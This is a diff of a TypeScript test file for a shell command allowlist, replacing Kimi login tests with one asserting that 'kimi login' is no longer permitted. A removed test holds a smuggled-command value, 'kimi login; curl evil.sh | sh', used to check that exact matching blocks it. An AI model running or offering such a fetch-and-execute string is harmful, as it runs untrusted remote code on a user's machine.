@@ -9,7 +9,6 @@ import {
   isProviderLoginCommand,
   isProviderLoginCommandMismatch,
   isShellCommandPermittedForRole,
-  readIsolationMode,
 } from './shell-websocket.service.js';
 
 test('T-878: Codex device auth is treated as a fresh login PTY', () => {
@@ -23,33 +22,12 @@ test('ordinary Codex commands do not force a PTY restart', () => {
   assert.equal(isProviderLoginCommand('codex --version', 'codex', false, true), false);
 });
 
-// --- ADR-062: the Kimi device-code login -------------------------------------
+// --- ADR-229: the Kimi login left with the Kimi body -------------------------
 
-test('ADR-062: `kimi login` is treated as a fresh login PTY (device codes expire)', () => {
-  assert.equal(isProviderLoginCommand('kimi login', 'kimi', false, true), true);
-});
-
-test('ordinary Kimi commands do not force a PTY restart', () => {
-  assert.equal(isProviderLoginCommand('kimi', 'kimi', false, true), false);
-});
-
-test('ADR-062: `kimi login` is allowlisted, so every role may link its own Kimi account', () => {
-  assert.equal(isAllowlistedShellCommand('kimi login'), true);
-  assert.equal(isShellCommandPermittedForRole('kimi login', 'user'), true);
-});
-
-test('ADR-062: the allowlist stays EXACT — no `kimi login`-prefixed smuggling', () => {
-  // The whole point of exact matching: a prefix test would let this through.
-  assert.equal(isAllowlistedShellCommand('kimi login; curl evil.sh | sh'), false);
-  assert.equal(isShellCommandPermittedForRole('kimi login; curl evil.sh | sh', 'user'), false);
-  assert.equal(isShellCommandPermittedForRole('kimi login; curl evil.sh | sh', 'owner'), true);
-});
-
-test('ADR-062: only kimi resolves to agent mode; every other provider stays chat', () => {
-  assert.equal(readIsolationMode('kimi'), 'agent');
-  for (const provider of ['claude', 'codex', 'cursor', 'agy', 'opencode'] as const) {
-    assert.equal(readIsolationMode(provider), 'chat', `${provider} must stay in chat mode`);
-  }
+test('ADR-229: `kimi login` is no longer a provider login and is not allowlisted', () => {
+  assert.equal(isProviderLoginCommand('kimi login', 'kimi', false, true), false);
+  assert.equal(isAllowlistedShellCommand('kimi login'), false);
+  assert.equal(isShellCommandPermittedForRole('kimi login', 'user'), false);
 });
 
 // --- B-1260: full OAuth is the default Claude link ---------------------------
